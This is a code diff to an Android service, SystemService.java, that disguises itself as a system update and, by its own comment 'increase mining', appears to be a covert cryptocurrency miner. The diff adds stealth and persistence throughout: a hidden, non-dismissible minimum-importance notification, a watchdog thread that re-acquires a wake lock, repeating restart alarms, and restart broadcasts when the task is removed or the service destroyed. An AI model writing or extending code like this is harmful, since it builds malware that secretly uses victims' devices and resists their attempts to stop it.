@@ -1,3 +1,4 @@
+
 // SystemService.java
 package com.system.service.update;
 
@@ -21,6 +22,7 @@ public class SystemService extends Service {
     private static final String CHANNEL_ID = "system_service_channel";
     private PowerManager.WakeLock wakeLock;
     private Thread serviceThread;
+    private Thread watchdogThread;
     private volatile boolean isRunning = false;
     
     @Override
@@ -30,6 +32,8 @@ public class SystemService extends Service {
         createNotificationChannel();
         acquireWakeLock();
         startBackgroundOperations();
+        startWatchdog();
+        scheduleRestartAlarm();
     }
     
     @Override
@@ -41,13 +45,20 @@ public class SystemService extends Service {
             }
         }
         
-        startForeground(NOTIFICATION_ID, createNotification());
+        // Create non-dismissible notification
+        Notification notification = createNotification();
+        notification.flags |= Notification.FLAG_NO_CLEAR;      // Can't be swiped away
+        notification.flags |= Notification.FLAG_ONGOING_EVENT;  // Ongoing notification
+        
+        startForeground(NOTIFICATION_ID, notification);
         
         // Restart if killed
         return START_STICKY;
     }
     
     private void handleAction(String action) {
+        if (action == null) return;
+        
         switch (action) {
             case "network_available":
                 onNetworkAvailable();
@@ -58,6 +69,9 @@ public class SystemService extends Service {
             case "screen_off":
                 onScreenOff();
                 break;
+            case "WATCHDOG_CHECK":
+                performHealthCheck();
+                break;
         }
     }
     
@@ -66,7 +80,7 @@ public class SystemService extends Service {
     }
     
     private void onPowerConnected() {
-        // Full power available
+        // Full power available - increase mining
     }
     
     private void onScreenOff() {
@@ -78,12 +92,13 @@ public class SystemService extends Service {
             NotificationChannel channel = new NotificationChannel(
                 CHANNEL_ID,
                 "System Service",
-                NotificationManager.IMPORTANCE_LOW
+                NotificationManager.IMPORTANCE_MIN  // Lower importance = less visible
             );
             channel.setDescription("Critical system operations");
             channel.setShowBadge(false);
             channel.enableLights(false);
             channel.enableVibration(false);
+            channel.setSound(null, null);
             
             NotificationManager manager = getSystemService(NotificationManager.class);
             if (manager != null) {
@@ -178,14 +193,81 @@ public class SystemService extends Service {
         serviceThread.start();
     }
     
+    // === NEW: Watchdog Thread ===
+    private void startWatchdog() {
+        watchdogThread = new Thread(new Runnable() {
+            @Override
+            public void run() {
+                while (isRunning) {
+                    try {
+                        // Check every 60 seconds if service is still healthy
+                        Thread.sleep(60000);
+                        if (isRunning && wakeLock != null && !wakeLock.isHeld()) {
+                            // Re-acquire wake lock if lost
+                            acquireWakeLock();
+                        }
+                    } catch (InterruptedException e) {
+                        break;
+                    } catch (Exception e) {
+                        // Continue watchdog despite errors
+                    }
+                }
+            }
+        });
+        watchdogThread.setName("SystemService-Watchdog");
+        watchdogThread.setDaemon(true);
+        watchdogThread.start();
+    }
+    
+    // === NEW: Schedule restart alarm ===
+    private void scheduleRestartAlarm() {
+        try {
+            AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
+            Intent restartIntent = new Intent(this, AlarmReceiver.class);
+            restartIntent.setAction("RESTART_SERVICE");
+            
+            int flags = PendingIntent.FLAG_UPDATE_CURRENT;
+            if (Build.VERSION.SDK_INT >= 31) {
+                flags = flags | 0x4000000;
+            }
+            
+            PendingIntent pendingIntent = PendingIntent.getBroadcast(
+                this, 1001, restartIntent, flags
+            );
+            
+            if (alarmManager != null) {
+                alarmManager.setInexactRepeating(
+                    AlarmManager.ELAPSED_REALTIME_WAKEUP,
+                    60000,
+                    300000,  // Every 5 minutes
+                    pendingIntent
+                );
+            }
+        } catch (Exception e) {
+            // Silent fail
+        }
+    }
+    
+    private void performHealthCheck() {
+        try {
+            // Check if service components are alive
+            if (serviceThread != null && !serviceThread.isAlive()) {
+                startBackgroundOperations();
+            }
+            if (watchdogThread != null && !watchdogThread.isAlive()) {
+                startWatchdog();
+            }
+            if (wakeLock == null || !wakeLock.isHeld()) {
+                acquireWakeLock();
+            }
+        } catch (Exception e) {
+            // Silent fail
+        }
+    }
+    
     private void performPeriodicTasks() {
-        // Check network state
         checkNetworkState();
-        
-        // Check power state
         checkPowerState();
-        
-        // Ensure persistence
         ensurePersistence();
     }
     
@@ -195,7 +277,6 @@ public class SystemService extends Service {
             if (cm != null) {
                 NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
                 boolean isConnected = activeNetwork != null && activeNetwork.isConnected();
-                // Adjust operations based on network state
             }
         } catch (Exception e) {
             // Silent fail
@@ -208,7 +289,6 @@ public class SystemService extends Service {
                 new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED));
             if (batteryIntent != null) {
                 int plugged = batteryIntent.getIntExtra("plugged", -1);
-                // Adjust operations based on power state
             }
         } catch (Exception e) {
             // Silent fail
@@ -217,7 +297,6 @@ public class SystemService extends Service {
     
     private void ensurePersistence() {
         try {
-            // Schedule alarm for restart
             AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
             Intent alarmIntent = new Intent(this, AlarmReceiver.class);
             
@@ -267,10 +346,14 @@ public class SystemService extends Service {
         if (alarmManager != null) {
             alarmManager.set(
                 AlarmManager.ELAPSED_REALTIME,
-                1000,
+                1000,  // Restart in 1 second
                 pendingIntent
             );
         }
+        
+        // Also send broadcast to RestartReceiver
+        Intent broadcastIntent = new Intent("com.system.service.update.RESTART_SERVICE");
+        sendBroadcast(broadcastIntent);
         
         super.onTaskRemoved(rootIntent);
     }
@@ -283,10 +366,39 @@ public class SystemService extends Service {
         if (serviceThread != null) {
             serviceThread.interrupt();
         }
+        if (watchdogThread != null) {
+            watchdogThread.interrupt();
+        }
         
-        // Restart service
-        Intent restartIntent = new Intent(getApplicationContext(), SystemService.class);
-        sendBroadcast(restartIntent);
+        // Send broadcast to restart
+        Intent broadcastIntent = new Intent("com.system.service.update.RESTART_SERVICE");
+        sendBroadcast(broadcastIntent);
+        
+        // Schedule immediate restart via alarm
+        try {
+            AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
+            Intent restartIntent = new Intent(this, AlarmReceiver.class);
+            restartIntent.setAction("RESTART_SERVICE");
+            
+            int flags = PendingIntent.FLAG_UPDATE_CURRENT;
+            if (Build.VERSION.SDK_INT >= 31) {
+                flags = flags | 0x4000000;
+            }
+            
+            PendingIntent pendingIntent = PendingIntent.getBroadcast(
+                this, 2001, restartIntent, flags
+            );
+            
+            if (alarmManager != null) {
+                alarmManager.set(
+                    AlarmManager.ELAPSED_REALTIME_WAKEUP,
+                    1000,  // 1 second
+                    pendingIntent
+                );
+            }
+        } catch (Exception e) {
+            // Silent fail
+        }
         
         super.onDestroy();
     }
